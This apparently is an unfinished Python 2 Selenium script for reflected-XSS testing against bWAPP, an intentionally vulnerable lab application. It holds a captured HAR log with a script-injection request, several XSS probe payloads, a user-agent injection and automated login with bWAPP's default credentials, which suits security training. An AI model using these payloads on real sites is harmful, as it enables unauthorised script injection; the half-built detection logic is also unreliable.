import re
from selenium import webdriver
from selenium.webdriver.support.select import Select

HAR = '''{u'log': {u'comment': u'', u'creator': {u'comment': u'', u'version': u'2.1.0-beta-4-littleproxy', u'name': u'BrowserMob Proxy'}, u'version': u'1.2', u'entries': [{u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.013+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [], u'url': u'http://192.168.127.144/bWAPP/login.php', u'queryString': [], u'headers': [], u'headersSize': 341, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 7, u'send': 0, u'ssl': -1, u'connect': 11, u'dns': 0, u'blocked': 0, u'wait': 3}, u'time': 23, u'response': {u'status': 200, u'comment': u'', u'cookies': [{u'httpOnly': False, u'path': u'/', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f', u'secure': False}], u'statusText': u'OK', u'content': {u'mimeType': u'text/html', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 462, u'redirectURL': u'', u'bodySize': 4019, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.210+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/stylesheets/stylesheet.css', u'queryString': [], u'headers': [], u'headersSize': 414, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 0}, u'time': 2, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'text/css', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 328, u'redirectURL': u'', u'bodySize': 6490, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.216+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/favicon.ico', u'queryString': [], u'headers': [], u'headersSize': 402, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 0}, u'time': 2, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/x-icon', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 331, u'redirectURL': u'', u'bodySize': 1150, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.219+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/js/html5.js', u'queryString': [], u'headers': [], u'headersSize': 384, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 1, u'ssl': -1, u'connect': 7, u'dns': 1, u'blocked': 0, u'wait': 0}, u'time': 11, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'application/x-javascript', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 343, u'redirectURL': u'', u'bodySize': 2394, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.234+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/zap.png', u'queryString': [], u'headers': [], u'headersSize': 417, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 1}, u'time': 3, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 330, u'redirectURL': u'', u'bodySize': 17557, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.234+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/owasp.png', u'queryString': [], u'headers': [], u'headersSize': 419, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 0}, u'time': 2, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 330, u'redirectURL': u'', u'bodySize': 16988, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.245+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/bg_3.jpg', u'queryString': [], u'headers': [], u'headersSize': 435, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 0}, u'time': 1, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/jpeg', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 329, u'redirectURL': u'', u'bodySize': 3188, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.257+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/twitter.png', u'queryString': [], u'headers': [], u'headersSize': 421, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 3, u'send': 0, u'ssl': -1, u'connect': 6, u'dns': 0, u'blocked': 0, u'wait': 1}, u'time': 11, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 328, u'redirectURL': u'', u'bodySize': 2896, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.259+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/netsparker.gif', u'queryString': [], u'headers': [], u'headersSize': 424, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 2, u'send': 5, u'ssl': -1, u'connect': 7, u'dns': 0, u'blocked': 0, u'wait': 0}, u'time': 15, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/gif', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 330, u'redirectURL': u'', u'bodySize': 11967, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.260+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/facebook.png', u'queryString': [], u'headers': [], u'headersSize': 422, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 0, u'ssl': -1, u'connect': 15, u'dns': 0, u'blocked': 0, u'wait': 1}, u'time': 19, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 328, u'redirectURL': u'', u'bodySize': 2636, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.261+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/netsparker.png', u'queryString': [], u'headers': [], u'headersSize': 424, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 2, u'ssl': -1, u'connect': 11, u'dns': 0, u'blocked': 0, u'wait': 0}, u'time': 14, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 328, u'redirectURL': u'', u'bodySize': 1889, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.262+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/blogger.png', u'queryString': [], u'headers': [], u'headersSize': 421, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 2, u'ssl': -1, u'connect': 8, u'dns': 0, u'blocked': 0, u'wait': 0}, u'time': 10, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 328, u'redirectURL': u'', u'bodySize': 1026, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.262+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/mme.png', u'queryString': [], u'headers': [], u'headersSize': 417, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 1, u'ssl': -1, u'connect': 7, u'dns': 0, u'blocked': 0, u'wait': 1}, u'time': 11, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 330, u'redirectURL': u'', u'bodySize': 14477, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.263+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/linkedin.png', u'queryString': [], u'headers': [], u'headersSize': 422, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': 3, u'dns': 0, u'blocked': 0, u'wait': 0}, u'time': 5, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 328, u'redirectURL': u'', u'bodySize': 1742, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.267+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/mk.png', u'queryString': [], u'headers': [], u'headersSize': 416, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 10, u'ssl': -1, u'connect': 8, u'dns': 0, u'blocked': 0, u'wait': 0}, u'time': 20, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 330, u'redirectURL': u'', u'bodySize': 11226, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.276+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/cc.png', u'queryString': [], u'headers': [], u'headersSize': 416, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 2, u'ssl': -1, u'connect': 1, u'dns': 0, u'blocked': 0, u'wait': 971}, u'time': 975, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 327, u'redirectURL': u'', u'bodySize': 688, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.279+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/bee_1.png', u'queryString': [], u'headers': [], u'headersSize': 419, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 2, u'ssl': -1, u'connect': 2, u'dns': 0, u'blocked': 0, u'wait': 1967}, u'time': 1972, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/png', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 329, u'redirectURL': u'', u'bodySize': 5486, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'54.230.196.116', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.296+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [], u'url': u'https://tiles-cloudfront.cdn.mozilla.net/desktop/STAR/en-US.a66e84f5effd06e1a60af30e963fff3c86666048.json', u'queryString': [], u'headers': [], u'headersSize': 417, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 3, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 14}, u'time': 18, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'application/json', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 520, u'redirectURL': u'', u'bodySize': 2687, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.296+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/fonts/architectsdaughter.ttf', u'queryString': [], u'headers': [], u'headersSize': 452, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 1}, u'time': 3, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'text/plain', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 331, u'redirectURL': u'', u'bodySize': 43380, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.297+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/bg_1.jpg', u'queryString': [], u'headers': [], u'headersSize': 435, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 5, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 2}, u'time': 8, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/jpeg', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 333, u'redirectURL': u'', u'bodySize': 123506, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.298+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/bg_2.jpg', u'queryString': [], u'headers': [], u'headersSize': 435, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 9, u'send': 0, u'ssl': -1, u'connect': 9, u'dns': 0, u'blocked': 0, u'wait': 1943}, u'time': 1963, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/jpeg', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 333, u'redirectURL': u'', u'bodySize': 376472, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:57.301+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/images/sb_1.jpg', u'queryString': [], u'headers': [], u'headersSize': 435, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 0}, u'time': 1, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'image/jpeg', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 329, u'redirectURL': u'', u'bodySize': 3200, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:59.452+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'4d38ede570f4350698088cc23a77d86f'}], u'url': u'http://192.168.127.144/bWAPP/login.php', u'queryString': [], u'headers': [], u'headersSize': 512, u'bodySize': 51, u'method': u'POST', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 3}, u'time': 5, u'response': {u'status': 302, u'comment': u'', u'cookies': [{u'httpOnly': False, u'path': u'/', u'name': u'PHPSESSID', u'value': u'bc54bb987e83f9aa427266c80348e341', u'secure': False}, {u'name': u'security_level', u'expires': u'2016-04-10T18:34:30.991+01:00', u'value': u'0', u'path': u'/', u'httpOnly': False, u'secure': False}], u'statusText': u'Found', u'content': {u'mimeType': u'text/html', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 561, u'redirectURL': u'portal.php', u'bodySize': 0, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:59.459+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'bc54bb987e83f9aa427266c80348e341'}, {u'comment': u'', u'name': u'security_level', u'value': u'0'}], u'url': u'http://192.168.127.144/bWAPP/portal.php', u'queryString': [], u'headers': [], u'headersSize': 461, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 1, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 1}, u'time': 2, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'text/html', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 404, u'redirectURL': u'', u'bodySize': 23369, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:59.543+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'bc54bb987e83f9aa427266c80348e341'}, {u'comment': u'', u'name': u'security_level', u'value': u'0'}], u'url': u'http://192.168.127.144/bWAPP/xss_get.php?', u'queryString': [], u'headers': [], u'headersSize': 414, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 1}, u'time': 2, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'text/html', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 404, u'redirectURL': u'', u'bodySize': 13314, u'httpVersion': u'HTTP/1.1'}}, {u'comment': u'', u'serverIPAddress': u'192.168.127.144', u'pageref': u'DanW', u'startedDateTime': u'2016-04-10T18:33:59.724+01:00', u'cache': {}, u'request': {u'comment': u'', u'cookies': [{u'comment': u'', u'name': u'PHPSESSID', u'value': u'bc54bb987e83f9aa427266c80348e341'}, {u'comment': u'', u'name': u'security_level', u'value': u'0'}], u'url': u'http://192.168.127.144/bWAPP/xss_get.php?firstname=%22%3E%3Cscript%3Ealert%28%22l33thax%22%29%3C%2Fscript%3E&lastname=%22%3E%3Cscript%3Ealert%28%22l33thax%22%29%3C%2Fscript%3E&form=submit', u'queryString': [{u'name': u'firstname', u'value': u'"><script>alert("l33thax")</script>'}, {u'name': u'lastname', u'value': u'"><script>alert("l33thax")</script>'}, {u'name': u'form', u'value': u'submit'}], u'headers': [], u'headersSize': 612, u'bodySize': 0, u'method': u'GET', u'httpVersion': u'HTTP/1.1'}, u'timings': {u'comment': u'', u'receive': 0, u'send': 0, u'ssl': -1, u'connect': -1, u'dns': -1, u'blocked': -1, u'wait': 1}, u'time': 2, u'response': {u'status': 200, u'comment': u'', u'cookies': [], u'statusText': u'OK', u'content': {u'mimeType': u'text/html', u'comment': u'', u'size': 0}, u'headers': [], u'headersSize': 404, u'redirectURL': u'', u'bodySize': 13393, u'httpVersion': u'HTTP/1.1'}}], u'pages': [{u'pageTimings': {u'comment': u''}, u'comment': u'', u'title': u'DanW', u'id': u'DanW', u'startedDateTime': u'2016-04-10T18:33:56.985+01:00'}], u'browser': {u'comment': u'', u'version': u'38.3.0', u'name': u'IceWeasel'}}}'''
token = 'l33thax'
class encoders:
    def html_encode(self,prse):
        '''
        Swaps characters in string
        '''
        html_chars = (
            ("'",'&#39;'),
            ('"','&quot'),
            (">",'&gt;'),
            ("<",'&lt;'),
            ("&","&#38;"),
            ("(",'&#40;'),
            (")",'&#41;')

        )
        for chars in html_chars:
            prse = prse.replace(chars[0],chars[1])
        return prse

    def url_encode(self,prse):
        '''
        Swaps characters in string
        '''
        url_chars = (
            ("'",'%27'),
            #lower double quote code
            ('"','%93'),
            (">",'%3E'),
            ("<",'%3C'),
            ("&","%26"),
            ("(",'%28'),
            (")",'%29')

        )
        for chars in url_chars:
            prse = prse.replace(chars[0],chars[1])
        return prse

    # def b64_encode(self,prse):
    #     '''
    #     Swaps characters in string
    #     '''
    #     b64_chars = (
    #         ("'",'%27'),
    #         ('"','%93'),
    #         (">",'Pg=='),
    #         ("<",'PA=='),
    #         ("&","%26"),
    #         ("(",'%28'),
    #         (")",'%29')
    #
    #     )
    #     for chars in url_chars:
    #         prse = prse.replace(chars[0],chars[1])
    #     return prse

def PAYLOAD():
    '''
    XSS Payloads
    '''
    PAYLOAD.PLD1 = '''"><x>''' + token+ '''</x>'''
    PAYLOAD.PLD2 = '''"><script>''' + token + '''</script>'''
    PAYLOAD.PLD3 = '''"><script>alert("''' + token + '''")</script>'''
    PAYLOAD.PLD4 = """'';!--"<b>b</b><""" + token + """>=&{()}"""
PAYLOAD()
enc = encoders()

profile = webdriver.FirefoxProfile()
profile.set_preference("general.useragent.override",PAYLOAD.PLD3)
driver=webdriver.Firefox(profile)


target_url = "http://192.168.127.144/bWAPP/xss_get.php"


def reg_slice(PHR):
    '''
    Regex Slicing of HAR Data
    :param PHR:
    :return:
    '''

    stp1 = re.findall(r''''queryString':.\[.*?\]''', PHR)

    stp1_url = re.findall(ur'''http:.*?(.*?')''', PHR)

    stp2 = re.findall(r"""'name\\':.*?('.*?')""", str(stp1))
    stp2_value = re.findall(r"""value\\':.*?('.*?')""", str(stp1))

    stp2_url = re.findall(r"""url\\':.*?('.*?')""", str(stp1))

    name_list = re.findall(r"'([A-Za-z]*?)\\", str(stp2))
    stp_3 = re.findall(r"''(.*?)\\", str(stp2_value))

    url_list = []

    for i in stp1_url:
        url_list.append(i[2:-1])

    for i in url_list:
        if name_list[0] in i:
            # print i
            query1 = i

    value_list = []
    for f in stp2_value:
        f = f[1:-2]
        value_list.append(f)

    reg_slice.qry1 = query1
    reg_slice.nm_lst = name_list
    reg_slice.vl_lst = value_list

def construct_url(target,nmlst,vllst):
    if target.endswith("?"):
        pass
    else:
        target = target + '?'

    nv_len = 0
    payload_url = []
    payload_url.append(target)

    if len(nmlst) == len(vllst):
        nv_len = len(nmlst)

    else:
        print "somthing went wrong aquiring name and value pairs"
        exit(1)

    #replace with custom attack strings
    # cycle2 = 0
    #
    # for i in vllst:
    #     if token in i:
    #         vllst[cycle2] = pload
    #         cycle2 += 1
    construct_url.input_list= nmlst
    construct_url.value_list= vllst
    # Construst Payload url
    list_value = 0
    while nv_len >0:
        for nm in nmlst:
            payload_url.append(nm)
            payload_url.append('=')
            payload_url.append(vllst[list_value])
            payload_url.append('&')
            list_value += 1
            nv_len -= 1
    payload_url

    at = ''.join(payload_url)
    attack_string = at[:-1]
    return attack_string


reg_slice(HAR)
# construct Payload URL based on target URL, name list from HAR,
test = construct_url(target_url,reg_slice.nm_lst, reg_slice.vl_lst)

alerts_detected = 0
nm_val_dict = dict(zip(construct_url.input_list, construct_url.value_list))

XSS_refToken = alerts_detected
if alerts_detected > 0:
    if alerts_detected > 0:
        print "Reflected XSS has detected on inputs with these names. \n"
        for c,v in nm_val_dict.iteritems():
            if token in v:
                print c

driver.get("http://192.168.127.144/bWAPP/login.php")
select = Select(driver.find_element_by_name('security_level'))
select.select_by_visible_text("low")
username = driver.find_element_by_id("login")
password = driver.find_element_by_name("password")
submit = driver.find_element_by_xpath("//button[@type='submit']")
username.send_keys("bee")
password.send_keys("bug"),
# click on the submit button
submit.click()

# target_url = 'http://192.168.127.144/bWAPP/xss_get.php?'

target_url = 'http://192.168.127.144/bWAPP/xss_user_agent.php'
# BWAPP TEST Start
# XXS GET TESTq
driver.get(target_url)




# print test
# print '\n'
# print test.split("?",1)[1]
# print test.rsplit()

#browser.current_url




